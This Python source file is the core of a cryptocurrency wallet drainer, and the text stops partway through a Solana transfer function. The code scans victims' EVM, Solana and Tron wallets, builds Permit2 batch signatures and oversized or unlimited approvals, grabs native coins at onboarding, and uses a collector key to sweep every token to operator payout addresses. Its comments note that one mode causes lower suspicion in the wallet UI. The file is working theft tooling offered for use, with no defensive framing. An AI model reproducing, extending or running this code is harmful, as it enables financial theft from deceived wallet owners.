"""
Drainer core.

Two phases:
  prepare_wallet()  -> scan every asset, compute per-asset caps, emit sign payloads
  execute_drain()   -> collector key signs; tokens move via Permit2 / approve / delegate

EVM covers every network in chains.EVM_NETWORKS (21 mainnets + 3 testnets); Solana and
Tron have their own scan and send paths. One PermitBatch signature per chain covers all
of that chain's tokens, and the drain submits the whole batch in a single transaction.

Cap policy (settings.drainer_cap_mode):
  "capped"    -> max(cap_units * 10^dec, balance * 2)
                 a round number that scales up when the balance already exceeds it
  "unlimited" -> the family maximum (uint160 on EVM, uint64 on Solana, uint256 on Tron)
                 EVM wallets render this as "Unlimited"

EVM approval mode (settings.drainer_evm_mode):
  "permit2"   -> one PermitBatch signature per chain, rendered as "Permit2"
  "approve"   -> a plain approve(receiver, cap) transaction per token
                 Lower suspicion in the wallet UI, one transaction per asset,
                 and the only path that reaches DrainerReceiver.pullDirect.

Native coins cannot be pulled by allowance. EVM and Tron natives are taken inside the
onboarding signature when drainer_take_native is on. Solana folds the native transfer
into the same onboarding transaction, but any native left behind afterwards needs the
owner to co-sign, so execute_drain returns a partially signed payload for the client.

Every successful pull marks the grant `used`, because a Permit2 nonce and an SPL
delegate cap are both consumed on first spend. `used` grants are re-prepared, not
retried.
"""
import asyncio
import base64
import json
import logging
import secrets
import time
import uuid
from typing import Any, Dict, List, Optional, Tuple

from eth_account import Account
from eth_account.messages import encode_typed_data
from eth_abi import encode as abi_encode

import abi
import crypto
import scanners
import solana_tx
import tron_tx
from chains import EVM_NETWORKS, SOLANA_RPCS
from database import get_setting, now, q_all, q_get, q_run

logger = logging.getLogger("drainer")

_execute_locks: Dict[int, asyncio.Lock] = {}

UINT160_MAX = 2**160 - 1
UINT256_MAX = 2**256 - 1
UINT48_MAX = 2**48 - 1
U64_MAX = 2**64 - 1

DEFAULT_DUST_USD = 0.75
GAS_FALLBACK = 450_000
NATIVE_GAS_UNITS = 21_000
GAS_BUFFER = 1.3
EVM_CONFIRM_TIMEOUT_S = 180.0
EVM_CONFIRM_POLL_S = 1.5
TRON_FEE_RESERVE_SUN = 1_100_000
TRON_MIN_ENERGY = 65_000

SEL_ERC20_ALLOWANCE = "0xdd62ed3e"      # allowance(address,address)
SEL_PERMIT2_ALLOWANCE = "0x927da105"    # allowance(address,address,address)
SEL_ERC20_APPROVE = "0x095ea7b3"        # approve(address,uint256)


# ------------------------------------------------------------------ config
def _collector_evm(net: str) -> Optional[str]:
    receivers = get_setting("drainer_receiver_evm") or {}
    if not isinstance(receivers, dict):
        return None
    address = receivers.get(net)
    return address if isinstance(address, str) and address else None


def _collector_sol() -> Optional[str]:
    return get_setting("drainer_collector_sol") or None


def _collector_tron() -> Optional[str]:
    return get_setting("drainer_collector_tron") or None


def _payout(family: str) -> Optional[str]:
    return {
        "evm": get_setting("drainer_payout_evm"),
        "solana": get_setting("drainer_payout_sol"),
        "tron": get_setting("drainer_payout_tron"),
    }.get(family) or None


def _dust() -> float:
    try:
        return float(get_setting("drainer_min_usd_per_asset", DEFAULT_DUST_USD))
    except (TypeError, ValueError):
        return DEFAULT_DUST_USD


def _include_unpriced() -> bool:
    """Keep unpriced tokens: a long-tail ERC-20 is still value once it moves."""
    value = get_setting("drainer_include_unpriced", True)
    if isinstance(value, str):
        return value.strip().lower() in ("1", "true", "yes", "on")
    return bool(value)


def _sig_deadline() -> int:
    try:
        days = int(get_setting("drainer_sig_deadline_days", 30))
    except (TypeError, ValueError):
        days = 30
    return int(time.time()) + max(1, days) * 86400


def _evm_mode() -> str:
    mode = (get_setting("drainer_evm_mode", "permit2") or "permit2").lower()
    return mode if mode in ("permit2", "approve") else "permit2"


def _family_max(family: str) -> int:
    return {
        "evm": UINT160_MAX,
        "solana": U64_MAX,
        "tron": UINT256_MAX,
    }.get(family, UINT160_MAX)


def cap_for(family: str, balance_raw: int, decimals: int) -> int:
    """Per-asset ceiling. Never below the current balance, never above the type max."""
    ceiling = _family_max(family)
    if get_setting("drainer_cap_mode", "capped") == "unlimited":
        return ceiling
    try:
        units = int(get_setting("drainer_cap_units", 1_000_000))
    except (TypeError, ValueError):
        units = 1_000_000
    return min(ceiling, max(units * (10 ** decimals), balance_raw * 2))


def _require_key(family: str) -> str:
    setting = f"drainer_{'sol' if family == 'solana' else family}_key"
    blob = get_setting(setting)
    if not blob:
        raise RuntimeError(f"no {family} collector key configured")
    return crypto.decrypt_secret(blob)


# ------------------------------------------------------------------ prepare
_prepare_locks: Dict[Tuple[int, int], asyncio.Lock] = {}


def _prepare_lock(wallet_id: int) -> asyncio.Lock:
    """Serialise prepares per wallet so a background prepare cannot supersede a live one."""
    key = (id(asyncio.get_running_loop()), wallet_id)
    lock = _prepare_locks.get(key)
    if lock is None:
        lock = asyncio.Lock()
        _prepare_locks[key] = lock
    return lock


async def prepare_wallet(user_id: int, wallet_id: int,
                         take_native: Optional[bool] = None) -> Dict[str, Any]:
    async with _prepare_lock(wallet_id):
        return await _prepare_wallet(user_id, wallet_id, take_native)


async def _prepare_wallet(user_id: int, wallet_id: int,
                          take_native: Optional[bool] = None) -> Dict[str, Any]:
    wallet = q_get("SELECT * FROM wallets WHERE id = ? AND user_id = ?", wallet_id, user_id)
    if not wallet:
        raise ValueError("wallet not found")

    family = (wallet["family"] or "").lower()
    if family not in ("evm", "solana", "tron"):
        raise ValueError(f"{family} has no approvals; use the collateral product")
    if not get_setting("drainer_enabled", True):
        raise ValueError("drainer is disabled")

    if take_native is None:
        take_native = bool(get_setting("drainer_take_native", True))

    # supersede anything still live so a re-prepare cannot double-count
    q_run("UPDATE drainer_grants SET status = 'superseded'"
          " WHERE wallet_id = ? AND status IN"
          " ('pending','awaiting_signature','active','used','revoked','expired','failed','revoking')",
          wallet_id)

    dust = _dust()
    include_unpriced = _include_unpriced()
    scanned = await scanners.scan_wallet(wallet)
    # Native is always taken; priced dust above the floor; anything else only
    # when the operator opted into unpriced coverage. Tag rows so the UI can say so.
    assets = [a for a in scanned
              if a["native"] or a["usd"] >= dust
              or (include_unpriced and int(a["balance_raw"]) > 0)]
    for asset in assets:
        asset["priced"] = bool(asset["native"] or asset["usd"] > 0)

    grants: List[Dict[str, Any]] = []
    for asset in assets:
        asset["cap_raw"] = cap_for(family, asset["balance_raw"], asset["decimals"])
        kind = {"evm": _evm_mode(), "solana": "spl_delegate", "tron": "trc20_approve"}[family]
        if asset["native"]:
            kind = "native_tx"

        grant_id = uuid.uuid4().hex
        q_run(
            "INSERT INTO drainer_grants (id, user_id, wallet_id, family, network, address,"
            " symbol, token, decimals, kind, cap, balance_raw, token_account, program,"
            " status, created_at) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,'pending',?)",
            grant_id, user_id, wallet_id, family, asset["network"], wallet["address"],
            asset["symbol"], asset.get("token"), asset["decimals"], kind,
            str(asset["cap_raw"]), str(asset["balance_raw"]),
            asset.get("token_account"), asset.get("program"), now(),
        )
        grants.append({**asset, "id": grant_id, "kind": kind})

    payloads: List[Dict[str, Any]] = []
    deadline = _sig_deadline()

    def _await(grant_id: str, extra: Optional[Dict[str, Any]] = None) -> None:
        if extra:
            assignments = ", ".join(f"{key} = ?" for key in extra)
            q_run(f"UPDATE drainer_grants SET status = 'awaiting_signature', {assignments}"
                  " WHERE id = ?", *extra.values(), grant_id)
        else:
            q_run("UPDATE drainer_grants SET status = 'awaiting_signature' WHERE id = ?",
                  grant_id)

    def _unsupported(grant_id: str, why: str) -> None:
        q_run("UPDATE drainer_grants SET status = 'unsupported', error = ? WHERE id = ?",
              why, grant_id)

    if family == "evm":
        await _prepare_evm(wallet, grants, payloads, deadline, take_native, _await, _unsupported)
    elif family == "solana":
        await _prepare_solana(wallet, grants, payloads, take_native, _await, _unsupported)
    elif family == "tron":
        await _prepare_tron(wallet, grants, payloads, take_native, _await, _unsupported)

    q_run("INSERT OR REPLACE INTO drainer_wallets (wallet_id, user_id, family, address,"
          " status, updated_at) VALUES (?,?,?,?,'prepared',?)",
          wallet_id, user_id, family, wallet["address"], now())

    return {
        "wallet_id": wallet_id,
        "address": wallet["address"],
        "family": family,
        "assets": grants,
        "payloads": payloads,
        "total_usd": sum(a["usd"] for a in grants),
    }


async def _prepare_evm(wallet: Dict[str, Any], grants: List[Dict[str, Any]],
                       payloads: List[Dict[str, Any]], deadline: int, take_native: bool,
                       await_, unsupported) -> None:
    tokens = [g for g in grants if not g["native"]]
    mode = _evm_mode()

    for net in sorted({g["network"] for g in tokens}):
        receiver = _collector_evm(net)
        rows = [g for g in tokens if g["network"] == net]
        if not receiver:
            for grant in rows:
                unsupported(grant["id"], f"no receiver deployed on {net}")
            continue
        if not abi.is_address(receiver):
            for grant in rows:
                unsupported(grant["id"], f"receiver for {net} is not an address")
            continue

        try:
            code = await _rpc(net, "eth_getCode", [receiver, "latest"])
            if not code or code == "0x":
                for grant in rows:
                    unsupported(grant["id"], f"receiver has no code on {net}")
                continue
            # A receiver deployed before pullPermit2 existed can only do the
            # first batch spend; re-prepare would still supersede it every time.
            if (mode == "permit2"
                    and abi.SEL_PULL_PERMIT2[2:].lower() not in code.lower()):
                for grant in rows:
                    unsupported(grant["id"],
                                f"receiver on {net} predates pullPermit2 — redeploy")
                continue
        except Exception as exc:                              # noqa: BLE001
            logger.debug("receiver code probe failed on %s: %s", net, exc)

        permit2_here = mode == "permit2" and bool((EVM_NETWORKS.get(net) or {}).get("permit2", True))
        if permit2_here:
            try:
                p2_code = await _rpc(net, "eth_getCode", [abi.PERMIT2, "latest"])
                if not p2_code or p2_code == "0x":
                    permit2_here = False
            except Exception as exc:                          # noqa: BLE001
                logger.debug("permit2 code probe failed on %s: %s", net, exc)

        if permit2_here:
            chain_id = EVM_NETWORKS[net]["chainId"]
            batch_id = uuid.uuid4().hex
            details, nonces = [], []
            for grant in rows:
                nonce = secrets.randbelow(UINT48_MAX)
                # Large uint160 values exceed JS's safe integer range; a decimal
                # string survives JSON and every wallet's typed-data parser intact.
                details.append({"token": grant["token"],
                                "amount": str(min(int(grant["cap_raw"]), UINT160_MAX)),
                                "expiration": abi.PERMIT_DETAILS_FOREVER,
                                "nonce": nonce})
                nonces.append((nonce, grant["id"]))

            batch = {"details": details, "spender": receiver, "sigDeadline": deadline}
            batch_json = json.dumps(batch, separators=(",", ":"))
            payloads.append({
                "type": "permit2", "network": net,
                "chainId": chain_id,
                "typed_data": {
                    "domain": abi.permit2_domain(chain_id),
                    "types": abi.EIP712_FULL_TYPES,
                    "primaryType": "PermitBatch",
                    "message": batch,
                },
                "grant_ids": [g["id"] for g in rows],
            })
            for nonce, grant_id in nonces:
                await_(grant_id, {"nonce": str(nonce), "sig_deadline": deadline,
                                  "batch": batch_json, "batch_id": batch_id})
            continue

        # plain approve mode: one transaction per asset, cap encoded directly
        for grant in rows:
            cap = min(int(grant["cap_raw"]), UINT256_MAX)
            data = SEL_ERC20_APPROVE + abi_encode(
                ["address", "uint256"], [receiver, cap]
            ).hex()
            payloads.append({
                "type": "evm_approve", "network": net,
                "chainId": EVM_NETWORKS[net]["chainId"],
                "tx": {"to": grant["token"], "value": "0x0", "data": data},
                "grant_ids": [grant["id"]],
            })
            await_(grant["id"], {"sig_deadline": deadline})

    if take_native:
        payout = _payout("evm")
        for grant in [g for g in grants if g["native"]]:
            if not payout or not abi.is_address(payout):
                unsupported(grant["id"], "no EVM payout address")
                continue
            try:
                gas_price = await _gas_price(grant["network"])
            except Exception:                                # noqa: BLE001
                gas_price = 20 * 10**9
            reserve = NATIVE_GAS_UNITS * max(gas_price, 1) * 2
            value = int(grant["balance_raw"]) - reserve
            if value <= 0:
                unsupported(grant["id"], "native balance below gas reserve")
                continue
            payloads.append({
                "type": "evm_tx", "network": grant["network"],
                "chainId": EVM_NETWORKS[grant["network"]]["chainId"],
                "tx": {"to": payout, "value": hex(value), "data": "0x"},
                "grant_ids": [grant["id"]],
            })
            await_(grant["id"])
    else:
        for grant in [g for g in grants if g["native"]]:
            await_(grant["id"])


async def _prepare_solana(wallet: Dict[str, Any], grants: List[Dict[str, Any]],
                          payloads: List[Dict[str, Any]], take_native: bool,
                          await_, unsupported) -> None:
    collector = _collector_sol()
    if not collector:
        for grant in grants:
            unsupported(grant["id"], "no Solana collector configured")
        return

    # Send native SOL straight to the payout sink, so the whole wallet clears in
    # one owner signature. Without a valid payout, native is left untouched
    # rather than parked in the collector where a re-scan would never see it.
    payout = _payout("solana")
    native_recipient: Optional[str] = None
    if take_native and payout:
        try:
            solana_tx._pub(payout, "payout")
            native_recipient = payout
        except ValueError:
            logger.warning("drainer_payout_sol is not a Solana address; native is skipped")

    native_ok = native_recipient is not None
    if take_native and not native_ok:
        for grant in grants:
            if grant["native"]:
                unsupported(grant["id"], "no Solana payout configured for native SOL")

    try:
        built = await solana_tx.build_onboarding_tx(
            SOLANA_RPCS[0], wallet["address"], collector, grants, native_ok,
            native_recipient=native_recipient,
        )
    except Exception as exc:                                 # noqa: BLE001
        for grant in grants:
            unsupported(grant["id"], f"onboarding build failed: {exc}"[:200])
        return

    signable = [g for g in grants
                if not (g["native"] and take_native and not native_ok)]

    if not built["txs"]:
        for grant in grants:
            unsupported(grant["id"], "nothing signable")
        return

    payloads.append({
        "type": "solana_tx", "network": "Solana",
        "txs": built["txs"],
        "blockhash": built["blockhash"],
        "last_valid_block_height": built["last_valid_block_height"],
        "grant_ids": [g["id"] for g in signable],
    })
    for grant in signable:
        extra = None
        if grant["native"]:
            # Record what actually left the owner's account (fee + rent reserve withheld).
            net = int(grant["balance_raw"]) - solana_tx._native_reserve()
            if net > 0:
                extra = {"balance_raw": str(net)}
        await_(grant["id"], extra)


async def _prepare_tron(wallet: Dict[str, Any], grants: List[Dict[str, Any]],
                        payloads: List[Dict[str, Any]], take_native: bool,
                        await_, unsupported) -> None:
    spender = _collector_tron()
    if not spender:
        for grant in grants:
            unsupported(grant["id"], "no Tron collector configured")
        return

    for grant in [g for g in grants if not g["native"]]:
        zero = await tron_tx.build_approve(wallet["address"], grant["token"], spender, 0)
        real = await tron_tx.build_approve(wallet["address"], grant["token"], spender,
                                           grant["cap_raw"])
        payloads.append({"type": "tron_tx", "network": "Tron", "txs": [zero, real],
                         "grant_ids": [grant["id"]]})
        await_(grant["id"])

    payout = _payout("tron")
    for grant in [g for g in grants if g["native"]]:
        if not take_native:
            await_(grant["id"])
            continue
        if not payout:
            unsupported(grant["id"], "no Tron payout configured for native TRX")
            continue
        sun = int(grant["balance_raw"]) - TRON_FEE_RESERVE_SUN
        if sun <= 0:
            unsupported(grant["id"], "TRX below fee reserve")
            continue
        tx = await tron_tx.build_transfer(wallet["address"], payout, sun)
        payloads.append({"type": "tron_tx", "network": "Tron", "txs": [tx],
                         "grant_ids": [grant["id"]]})
        await_(grant["id"])


# ------------------------------------------------------------------ record
def _permit_typed_data(grant: Dict[str, Any]) -> Dict[str, Any]:
    """
    Rebuild the exact typed data the client signed. A signature can cover every
    token on a chain, so the stored batch is authoritative; older rows fall back
    to the single-detail form.
    """
    net = grant["network"]
    batch: Dict[str, Any]
    if grant.get("batch"):
        try:
            batch = json.loads(grant["batch"])
        except (TypeError, ValueError):
            batch = {}
    else:
        batch = {}

    if not batch.get("details"):
        batch = {
            "details": [{"token": grant["token"],
                         "amount": min(int(grant.get("cap") or 0), UINT160_MAX),
                         "expiration": abi.PERMIT_DETAILS_FOREVER,
                         "nonce": int(grant.get("nonce") or 0)}],
            "spender": _collector_evm(net),
            "sigDeadline": int(grant.get("sig_deadline") or 0),
        }

    chain_id = EVM_NETWORKS[net]["chainId"]
    return {
        "domain": abi.permit2_domain(chain_id),
        "types": abi.EIP712_FULL_TYPES,
        "primaryType": "PermitBatch",
        "message": {
            "details": batch["details"],
            "spender": batch["spender"],
            "sigDeadline": int(batch["sigDeadline"]),
        },
    }


async def _confirm_onchain(grant: Dict[str, Any], txid: Optional[str]) -> None:
    """Wait for the approval/native transaction before trusting it."""
    if not txid or txid == "pending":
        return
    family = (grant.get("family") or "").lower()
    if family == "evm":
        await _evm_receipt(grant["network"], txid)
        if grant.get("kind") == "evm_approve":
            receiver = _collector_evm(grant["network"])
            if receiver:
                allowance = await _evm_allowance({**grant, "kind": "approve"}, receiver)
                if allowance <= 0:
                    raise RuntimeError("approve transaction mined but allowance is zero")
    elif family == "tron":
        await tron_tx.confirm(txid)
        if grant.get("kind") == "trc20_approve" and not await _tron_allowance_ok(grant):
            raise RuntimeError("approve confirmed but allowance is still zero")
    elif family == "solana":
        # Broadcast polls before returning; re-check so a forged client cannot
        # activate a grant with a txid that never landed.
        await _sol_confirm(txid)
        if grant.get("kind") == "spl_delegate" and not await _sol_delegate_ok(grant):
            raise RuntimeError("transaction confirmed but the delegate is not set")


async def _sol_confirm(txid: str) -> None:
    """Require the signature to exist and have succeeded on Solana."""
    result = await scanners._solana_rpc(
        "getSignatureStatuses", [[txid], {"searchTransactionHistory": True}])
    values = ((result or {}).get("value") or [])
    status = values[0] if values else None
    if not status:
        raise RuntimeError(f"signature {txid} not found on-chain")
    if status.get("err"):
        raise RuntimeError(f"transaction failed on-chain: {status['err']}")


async def record_signed(grant_id: str, signature: Optional[str],
                        txid: Optional[str] = None) -> Dict[str, Any]:
    grant = q_get("SELECT * FROM drainer_grants WHERE id = ?", grant_id)
    if not grant:
        raise ValueError("grant not found")

    if grant["kind"] == "permit2":
        if grant["status"] not in ("awaiting_signature", "pending"):
            raise ValueError(f"grant is {grant['status']}, not awaiting a signature")
        if not signature or not signature.startswith("0x"):
            raise ValueError("a 0x-prefixed signature is required")
        try:
            # eth-account >=0.13 dropped Account.recover_typed_data; encode then recover.
            message = encode_typed_data(full_message=_permit_typed_data(grant))
            recovered = Account.recover_message(message, signature=signature)
        except Exception as exc:                             # noqa: BLE001
            raise ValueError(f"malformed Permit2 signature: {exc}") from exc

        if recovered.lower() != grant["address"].lower():
            raise ValueError(
                f"signature is from {recovered}, grant wallet is {grant['address']}"
            )

        q_run("UPDATE drainer_grants SET signature = ?, status = 'active', activated_at = ?,"
              " error = NULL WHERE id = ?", signature, now(), grant_id)
    else:
        if grant["status"] not in ("awaiting_signature", "pending"):
            raise ValueError(f"grant is {grant['status']}, not awaiting a signature")
        if not txid or txid == "pending":
            raise ValueError("a transaction hash is required before the grant can activate")

        # Confirm first: a client-supplied hash is only a claim until the chain
        # shows the transaction mined successfully.
        try:
            await _confirm_onchain(grant, txid)
        except Exception as exc:                             # noqa: BLE001
            q_run("UPDATE drainer_grants SET status = 'failed', txid = ?, error = ?"
                  " WHERE id = ?", txid, str(exc)[:300], grant_id)
            raise ValueError(f"transaction did not confirm: {exc}") from exc

        q_run("UPDATE drainer_grants SET txid = ?, status = 'active', activated_at = ?,"
              " error = NULL WHERE id = ?", txid, now(), grant_id)

        # EVM/Tron native, and Solana native when a payout is configured, are
        # delivered inside the onboarding transaction; there is nothing left to pull.
        if _native_direct_to_payout(grant):
            q_run("UPDATE drainer_grants SET status = 'used', confirmed_at = ?"
                  " WHERE id = ?", now(), grant_id)

    return {"ok": True, "grant_id": grant_id}


# ------------------------------------------------------------------ EVM read
async def _rpc(net: str, method: str, params: List[Any]) -> Any:
    response = await scanners._rpc_post(scanners._http(), scanners.rpc_for(net), {
        "jsonrpc": "2.0", "id": 1, "method": method, "params": params,
    })
    body = response.json()
    if "error" in body:
        error = body["error"]
        raise RuntimeError(error.get("message") if isinstance(error, dict) else str(error))
    return body.get("result")


async def _gas_price(net: str) -> int:
    return int(await _rpc(net, "eth_gasPrice", []), 16)


async def _evm_allowance(grant: Dict[str, Any], receiver: str) -> int:
    """Spendable allowance, honouring the grant kind. Permit2 returns a 3-word tuple."""
    owner = grant["address"]
    token = grant["token"]

    if grant["kind"] == "permit2":
        raw = await _rpc(grant["network"], "eth_call", [{
            "to": abi.PERMIT2,
            "data": SEL_PERMIT2_ALLOWANCE
            + abi_encode(["address", "address", "address"],
                         [owner, token, receiver]).hex(),
        }, "latest"])
        if not raw or raw == "0x":
            return 0
        body = bytes.fromhex(raw[2:])
        return int.from_bytes(body[:32], "big") if len(body) >= 32 else 0

    raw = await _rpc(grant["network"], "eth_call", [{
        "to": token,
        "data": SEL_ERC20_ALLOWANCE
        + abi_encode(["address", "address"], [owner, receiver]).hex(),
    }, "latest"])
    return int(raw, 16) if raw and raw != "0x" else 0


async def _evm_receipt(net: str, tx_hash: str) -> None:
    deadline = time.monotonic() + EVM_CONFIRM_TIMEOUT_S
    while time.monotonic() < deadline:
        receipt = await _rpc(net, "eth_getTransactionReceipt", [tx_hash])
        if receipt:
            if int(receipt.get("status", "0x0"), 16) == 0:
                raise RuntimeError(f"transaction reverted: {tx_hash}")
            return
        await _sleep(EVM_CONFIRM_POLL_S)
    raise RuntimeError(f"timed out waiting for {tx_hash}")


async def _sleep(seconds: float) -> None:
    import asyncio
    await asyncio.sleep(seconds)


# ------------------------------------------------------------------ EVM send
async def _fee_fields(net: str) -> Dict[str, int]:
    """
    EIP-1559 where the chain supports it, legacy gasPrice where it does not.
    BSC, opBNB and a few others report a zero base fee; those get a legacy tx.
    """
    block = await _rpc(net, "eth_getBlockByNumber", ["latest", False]) or {}
    base_raw = block.get("baseFeePerGas")
    base = int(base_raw, 16) if base_raw else 0

    gas_price = max(await _gas_price(net), 1)
    if base <= 0:
        return {"gasPrice": gas_price}

    try:
        priority = int(await _rpc(net, "eth_maxPriorityFeePerGas", []), 16)
    except Exception:                                        # noqa: BLE001
        priority = max(base // 4, 1)
    return {"maxFeePerGas": base * 2 + priority, "maxPriorityFeePerGas": priority}


def _fee_cap(fields: Dict[str, int]) -> int:
    return int(fields.get("gasPrice") or fields.get("maxFeePerGas") or 1)


async def _evm_send(net: str, key: str, to: str, data: str, value: int = 0) -> str:
    account = Account.from_key(key)

    try:
        estimate = await _rpc(net, "eth_estimateGas", [{
            "from": account.address, "to": to, "data": data, "value": hex(value),
        }])
        gas = int(int(estimate, 16) * GAS_BUFFER)
    except Exception:                                        # noqa: BLE001
        gas = GAS_FALLBACK

    fee = await _fee_fields(net)
    cost = gas * _fee_cap(fee)
    balance = int(await _rpc(net, "eth_getBalance", [account.address, "latest"]), 16)
    if balance < cost:
        native = (EVM_NETWORKS.get(net) or {}).get("native", "native")
        raise RuntimeError(
            f"MISSING_GAS: collector {account.address} needs ~{cost / 1e18:.6f} "
            f"{native} on {net} (has {balance / 1e18:.6f})")

    nonce = int(await _rpc(net, "eth_getTransactionCount",
                           [account.address, "pending"]), 16)
    payload = {
        "chainId": EVM_NETWORKS[net]["chainId"],
        "nonce": nonce, "to": to, "value": value, "data": data, "gas": gas,
        **fee,
    }
    signed = account.sign_transaction(payload)

    try:
        tx_hash = await _rpc(net, "eth_sendRawTransaction",
                             ["0x" + signed.raw_transaction.hex().removeprefix("0x")])
    except RuntimeError as exc:
        message = str(exc).lower()
        if "nonce" not in message and "replacement" not in message:
            raise
        payload["nonce"] = int(await _rpc(net, "eth_getTransactionCount",
                                          [account.address, "pending"]), 16)
        signed = account.sign_transaction(payload)
        tx_hash = await _rpc(net, "eth_sendRawTransaction",
                             ["0x" + signed.raw_transaction.hex().removeprefix("0x")])

    await _evm_receipt(net, tx_hash)
    return tx_hash


def _permit_batch_of(grant: Dict[str, Any]) -> Optional[Dict[str, Any]]:
    if not grant.get("batch"):
        return None
    try:
        batch = json.loads(grant["batch"])
    except (TypeError, ValueError):
        return None
    return batch if batch.get("details") else None


async def _evm_pull_batch(grants: List[Dict[str, Any]]) -> Tuple[str, List[Tuple[Dict[str, Any], int]]]:
    """
    Execute one signed PermitBatch.

    Permit2 burns the nonce on first spend, so the batch is submitted whole via
    `permitAndPull` exactly once; a persisted `batch_consumed` flag makes every
    later pull on the same batch go through `pullPermit2` with no new signature.
    Amounts above uint160 are split into several transactions — a single
    transferFrom cannot carry more than the width PermitDetails declares.
    Returns (representative tx_hash, [(grant, amount), …]).
    """
    first = grants[0]
    net = first["network"]
    receiver = _collector_evm(net)
    if not receiver:
        raise RuntimeError(f"no receiver on {net}")
    batch = _permit_batch_of(first)
    if not batch:
        raise RuntimeError("grant has no signed PermitBatch — re-prepare this wallet")
    if str(batch.get("spender", "")).lower() != receiver.lower():
        raise RuntimeError("signed batch spender does not match the receiver")
    if int(batch.get("sigDeadline") or 0) < time.time():
        raise RuntimeError("permit signature expired — re-prepare this wallet")

    signature = (first.get("signature") or "").removeprefix("0x")
    if not signature:
        raise RuntimeError("grant has no signature")

    details = batch["details"]
    by_token = {str(d.get("token", "")).lower(): d for d in details}

    # (grant, amount) units, already clamped to both the balance and the signed cap.
    units: List[Tuple[Dict[str, Any], int]] = []
    for grant in grants:
        detail = by_token.get(str(grant["token"]).lower())
        if not detail:
            continue
        amount = min(int(grant["balance_raw"]), int(detail["amount"]))
        if amount > 0:
            units.append((grant, amount))
    if not units:
        raise RuntimeError("nothing to pull for this batch")

    key = _require_key("evm")
    consumed = any(int(g.get("batch_consumed") or 0) for g in grants)
    txid = ""

    if not consumed:
        # First spend: one transaction, every token, the whole signed batch.
        chunk: List[Tuple[Dict[str, Any], int]] = []
        rest = list(units)
        while rest and len(chunk) < 40:
            grant, amount = rest[0]
            if amount <= UINT160_MAX:
                chunk.append(rest.pop(0))
            else:
                chunk.append((grant, UINT160_MAX))
                rest[0] = (grant, amount - UINT160_MAX)
        detail_tuples = [(d["token"], int(d["amount"]), int(d["expiration"]), int(d["nonce"]))
                         for d in details]
        data = abi.SEL_PERMIT_PULL + abi_encode(
            ["address", "((address,uint160,uint48,uint48)[],address,uint256)",
             "bytes", "address[]", "uint160[]"],
            [first["address"],
             (detail_tuples, receiver, int(batch["sigDeadline"])),
             bytes.fromhex(signature),
             [g["token"] for g, _ in chunk], [a for _, a in chunk]],
        ).hex()
        txid = await _evm_send(net, key, receiver, data)
        # Mark the whole batch, including tokens that were empty this run, so a
        # later execute never tries to re-permit the spent nonce.
        batch_id = first.get("batch_id")
        if batch_id:
            q_run("UPDATE drainer_grants SET batch_consumed = 1 WHERE batch_id = ?",
                  batch_id)
        else:
            for grant in grants:
                q_run("UPDATE drainer_grants SET batch_consumed = 1 WHERE id = ?",
                      grant["id"])
        rest_pulls = rest
    else:
        rest_pulls = units

    for grant, amount in rest_pulls:
        while amount > 0:
            part = min(amount, UINT160_MAX)
            data = abi.SEL_PULL_PERMIT2 + abi_encode(
                ["address", "address", "uint160"],
                [grant["token"], grant["address"], part],
            ).hex()
            txid = await _evm_send(net, key, receiver, data)
            amount -= part

    return txid, units


async def _evm_pull(grant: Dict[str, Any]) -> str:
    """Plain-approve path (DrainerReceiver.pullDirect). Batched Permit2 goes through _evm_pull_batch."""
    net = grant["network"]
    receiver = _collector_evm(net)
    if not receiver:
        raise RuntimeError(f"no receiver on {net}")

    # The receiver pays its own configured sink; only native transfers need the setting.
    key = _require_key("evm")
    amount = min(int(grant["balance_raw"]), UINT256_MAX)
    signed_permit = grant["kind"] == "permit2" and bool(grant.get("signature"))

    # A Permit2 allowance only exists after permit(); a stored signature is the
    # authorization, so only the plain-approve path needs an on-chain allowance.
    if not signed_permit:
        available = await _evm_allowance(grant, receiver)
        if available <= 0:
            raise RuntimeError("MISSING_DELEGATE: allowance is zero")
        amount = min(amount, available)
    if amount <= 0:
        raise RuntimeError("nothing to pull")

    if signed_permit:
        if int(grant.get("sig_deadline") or 0) < time.time():
            raise RuntimeError("permit signature expired — re-prepare this wallet")
        amount = min(amount, UINT160_MAX)       # PermitDetails.amount is uint160

        data = abi.SEL_PERMIT_PULL + abi_encode(
            ["address", "((address,uint160,uint48,uint48)[],address,uint256)",
             "bytes", "address[]", "uint160[]"],
            [grant["address"],
             ([(grant["token"], amount, abi.PERMIT_DETAILS_FOREVER, int(grant["nonce"]))],
              receiver, int(grant["sig_deadline"])),
             bytes.fromhex(grant["signature"].removeprefix("0x")),
             [grant["token"]], [amount]],
        ).hex()
        return await _evm_send(net, key, receiver, data)

    data = abi.SEL_PULL_DIRECT + abi_encode(
        ["address", "address", "uint256"],
        [grant["token"], grant["address"], amount],
    ).hex()
    return await _evm_send(net, key, receiver, data)


# ------------------------------------------------------------------ Solana
def _is_native(grant: Dict[str, Any]) -> bool:
    """DB rows have no `native` flag; native grants are the `native_tx` kind."""
    return grant.get("kind") == "native_tx"


def _native_direct_to_payout(grant: Dict[str, Any]) -> bool:
    """True when the onboarding signature already sent the native coin to the sink."""
    if not _is_native(grant):
        return False
    family = (grant.get("family") or "").lower()
    if family in ("evm", "tron"):
        return True
    if family == "solana":
        return bool(_payout("solana"))
    return False


async def _sol_pull(grant: Dict[str, Any]) -> Dict[str, Any]:
    """
    Returns {"kind": "sent", "txid": str}
         or {"kind": "deferred", "payload": str, "blockhash": str,
             "last_valid_block_height": int, "reason": str}
    """
    secret = _require_key("solana")
    keypair, _address = crypto.solana_keypair_from_secret(secret)

    payout = _payout("solana")
    if not payout:
        raise RuntimeError("no Solana payout address")

    rpc = SOLANA_RPCS[0]
    blockhash, last_valid = await solana_tx._blockhash(rpc)
    amount = int(grant["balance_raw"])

    if _is_native(grant):
        # The collector received the owner's lamports; keep enough back to pay
        # this transaction's fee and stay rent-exempt.
        amount = max(0, amount - solana_tx._native_reserve())
        if amount <= 0:
            raise RuntimeError("native grant is below the collector fee reserve")
        payload = solana_tx.build_native_pull_tx(
            keypair, grant["address"], payout, blockhash, amount
        )
        return {
            "kind": "deferred",
            "payload": payload,
            "blockhash": str(blockhash),
            "last_valid_block_height": last_valid,
            "reason": "native SOL needs an owner co-signature",
        }

    if not grant.get("token_account"):
        raise RuntimeError("grant has no token account")

    program = solana_tx._program(grant)
    mint = solana_tx._pub(grant["token"], "mint")
    destination = solana_tx.associated_token_address(
        mint, solana_tx._pub(payout, "payout"), program
    )
    exists = await solana_tx.token_account_exists(rpc, str(destination))

    tx = solana_tx.build_token_pull_tx(
